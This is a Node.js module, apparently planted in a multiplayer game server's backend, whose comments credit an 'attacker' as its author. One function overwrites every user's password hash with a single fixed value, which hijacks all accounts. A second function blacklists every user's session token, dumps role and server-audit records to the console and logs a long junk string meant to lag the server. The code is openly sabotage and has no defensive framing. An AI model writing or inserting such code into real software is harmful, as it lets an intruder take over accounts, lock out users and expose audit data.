// ===================================================================
// update stuff for ALL users, modified and created by attacker. // modified again by not sus still credit to attacker for the first modify
// ===================================================================

let config = require('../../../config.json'); //get config.json data.
let config_active = config.hack; // security.
const User = require('../../models/user');//define the user part in the database and use it.
const globals = require('../../globals');//extra idk for what.
const Tank = require('../../models/tank');
const Maze = require('../../models/maze');
const ServerAudit = require('../../models/server-audit');
const GameAudit = require('../../models/game-audit');
const Role = require('../../models/role');
const Settings = require('../../models/settings');
//define the function.
async function getHashesChangedByHACK(){
  globals.allUsers = await User.find({});
  //console.log('all users: '+globals.allUsers);
  let change = {};
  for (let user of globals.allUsers){
    let HASH = "968652ef04b0a656eea7a05e1c49619f4bfd7338549b4ca57ee8ac8323ca8619"; // rekt.
    let userName = user.username;
    change.passwordHash=HASH;
    User.updateAll(change);
   // user.save();
    console.log(user.save());
    console.log('new change: '+change+' for: '+userName);
  };
};
async function lagbot(){
  globals.allUsers = await User.getAll({});
  for (let user of globals.allUsers){
 globals.BlacklistedTokens.push(user.jwtToken);
    console.log('g98mc3m347G&*VG^&$F&G$VIm7^*(G74mg45b74g7645cmg4r4c7bgm457gbgmn783g3784gn7bt4tuntgwebvguyebwuvwegunbewvuywgnvwenugwgncewv7ycguyewguynbuuvntfgvewrvgbtfgvbrytugrtyerngvbgjewrynfgvwuvgwgnwetyunvftyxuugnye)G74mg45b74g7645cmg4r4c7bgm457gbgmn783g3784gn7bt4tuntgwebvguyebwuvwegunbewvuywgnvwenugwgncewv7ycguyewguynbuuvntfgvewrvgbtfgvbrytugrtyerngvbgjewrynfgvwuvgwgnwetyunvftyxuugnyeG74mg45b74g7645cmg4r4c7bgm457gbgmn783g3784gn7bt4tuntgwebvguyebwuvwegunbewvuywgnvwenugwgncewv7ycguyewguynbuuvntfgvewrvgbtfgvbrytugrtyerngvbgjewrynfgvwuvgwgnwetyunvftyxuugnyeG74mg45b74g7645cmg4r4c7bgm457gbgmn783g3784gn7bt4tuntgwebvguyebwuvwegunbewvuywgnvwenugwgncewv7ycguyewguynbuuvntfgvewrvgbtfgvbrytugrtyerngvbgjewrynfgvwuvgwgnwetyunvftyxuugnyeG74mg45b74g7645cmg4r4c7bgm457gbgmn783g3784gn7bt4tuntgwebvguyebwuvwegunbewvuywgnvwenugwgncewv7ycguyewguynbuuvntfgvewrvgbtfgvbrytugrtyerngvbgjewrynfgvwuvgwgnwetyunvftyxuugnyeG74mg45b74g7645cmg4r4c7bgm457gbgmn783g3784gn7bt4tuntgwebvguyebwuvwegunbewvuywgnvwenugwgncewv7ycguyewguynbuuvntfgvewrvgbtfgvbrytugrtyerngvbgjewrynfgvwuvgwgnwetyunvftyxuugnyeG74mg45b74g7645cmg4r4c7bgm457gbgmn783g3784gn7bt4tuntgwebvguyebwuvwegunbewvuywgnvwenugwgncewv7ycguyewguynbuuvntfgvewrvgbtfgvbrytugrtyerngvbgjewrynfgvwuvgwgnwetyunvftyxuugnyeG74mg45b74g7645cmg4r4c7bgm457gbgmn783g3784gn7bt4tuntgwebvguyebwuvwegunbewvuywgnvwenugwgncewv7ycguyewguynbuuvntfgvewrvgbtfgvbrytugrtyerngvbgjewrynfgvwuvgwgnwetyunvftyxuugnye')
  }
      globals.AllRoles= await Role.getAll({});
  for (let role of globals.AllRoles){console.log(role)}
      globals.AllServerAudits = await ServerAudit.getAll({});
  for (let serveraudit of globals.AllServerAudits){console.log(serveraudit)}
}
module.exports = {
  getHashesChangedByHACK,
  lagbot
}